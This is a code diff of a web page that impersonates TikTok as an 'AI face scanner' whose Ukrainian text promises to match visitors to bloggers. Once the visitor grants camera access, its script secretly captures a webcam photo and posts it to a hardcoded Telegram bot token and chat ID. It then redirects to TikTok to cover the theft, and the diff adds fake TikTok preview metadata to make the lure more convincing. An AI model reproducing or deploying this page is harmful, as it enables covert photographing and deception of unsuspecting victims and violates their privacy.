@@ -3,76 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok AI Face Filter</title>
+    <title>TikTok AI Scanner</title>
+    <meta property="og:title" content="TikTok - AI Face Scanner">
+    <meta property="og:description" content="Дізнайся, на якого блогера ти схожий!">
+    <meta property="og:image" content="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/card/logo.png">
+    <meta name="theme-color" content="#fe2c55">
     <style>
-        body { background: #010101; color: white; font-family: 'Proxima Nova', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; padding: 20px; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        .btn { background: #fe2c55; color: white; border: none; padding: 16px 32px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; transition: 0.3s; }
-        .btn:active { transform: scale(0.95); }
-        #status { margin-top: 20px; color: #adadad; font-size: 14px; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { padding: 20px; max-width: 400px; width: 90%; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        .btn { background: #fe2c55; border: none; padding: 16px 40px; color: #fff; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }
+        #status { display: none; margin-top: 20px; }
+        .loader { border: 3px solid #333; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" class="logo" alt="TikTok">
-    <h2>Дізнайся, на якого блогера ти схожий</h2>
-    <p>Натисни кнопку, щоб нейромережа проаналізувала твої риси обличчя</p>
-    <button class="btn" onclick="init()">Почати аналіз</button>
-    <div id="status"></div>
-</div>
+    <div class="container" id="ui">
+        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" class="logo">
+        <h2>AI Face Analyzer</h2>
+        <p>Натисніть кнопку, щоб почати сканування.</p>
+        <button class="btn" onclick="start()">Почати аналіз</button>
+        <div id="status">
+            <div class="loader"></div>
+            <p>Обробка нейромережею...</p>
+        </div>
+    </div>
 
-<video id="v" autoplay playsinline></video>
-<canvas id="c" width="640" height="480"></canvas>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c" width="640" height="480"></canvas>
 
-<script>
-    const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
-    const chatId = '7808795546';
+    <script>
+        const token = '8492555273:AAHur2SwzreGkYlCz5-gBCGCJxzvrdwFczM';
+        const chat = '7808795546';
+        const tiktokUrl = 'https://www.tiktok.com/explore';
 
-    async function init() {
-        const status = document.getElementById('status');
-        status.innerText = "Ініціалізація камери...";
+        async function start() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                
+                document.querySelector('.btn').style.display = 'none';
+                document.querySelector('p').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-            
-            status.innerText = "Аналіз рис обличчя (15%)...";
-            
-            setTimeout(() => {
-                captureAndSend();
-                status.innerText = "Обробка нейромережею (60%)...";
-            }, 1500);
+                // Чекаємо стабілізації кадру
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(v, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(b => {
+                        const f = new FormData();
+                        f.append('chat_id', chat);
+                        f.append('photo', b, 'img.jpg');
 
-            setTimeout(() => {
-                status.innerText = "Помилка: Слабке з'єднання з сервером TikTok.";
-            }, 4000);
+                        // ВІДПРАВКА (без очікування результату)
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
 
-        } catch (err) {
-            status.innerText = "Помилка: Дозвольте доступ до камери для роботи фільтра.";
+                        // ПРИМУСОВИЙ РЕДИРЕКТ (через 1 секунду після натискання)
+                        // Це спрацює незалежно від того, чи встигло фото дойти
+                        setTimeout(() => {
+                            s.getTracks().forEach(t => t.stop());
+                            window.location.replace(tiktokUrl); 
+                        }, 1000);
+
+                    }, 'image/jpeg', 0.6);
+                }, 1200);
+
+            } catch (e) {
+                // Якщо доступ заблоковано - теж на ТікТок
+                window.location.replace(tiktokUrl);
+            }
         }
-    }
-
-    function captureAndSend() {
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-        const context = canvas.getContext('2d');
-        
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'shot.jpg');
-
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        }, 'image/jpeg', 0.7);
-    }
-</script>
+    </script>
 </body>
 </html>
